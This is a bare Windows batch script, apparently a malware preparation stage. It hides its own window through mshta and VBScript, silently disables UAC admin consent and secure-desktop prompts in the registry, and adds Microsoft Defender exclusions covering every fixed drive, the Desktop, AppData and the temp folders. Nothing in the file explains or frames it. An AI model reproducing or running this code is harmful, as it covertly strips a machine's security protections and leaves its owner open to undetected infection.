@echo off

if "%1"=="h" goto :run
mshta vbscript:CreateObject("WScript.Shell").Run("""%~f0"" h",0)(window.close)&&exit

:run

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d 0 /f >nul 2>&1


powershell -WindowStyle Hidden -Command "$drives = Get-CimInstance -Query 'Select Name from Win32_LogicalDisk Where DriveType = 3'; foreach ($d in $drives) { Add-MpPreference -ExclusionPath ($d.Name + '\') }; Add-MpPreference -ExclusionPath $env:USERPROFILE'\Desktop', $env:APPDATA, $env:TEMP, 'C:\Windows\Temp'" >nul 2>&1

exit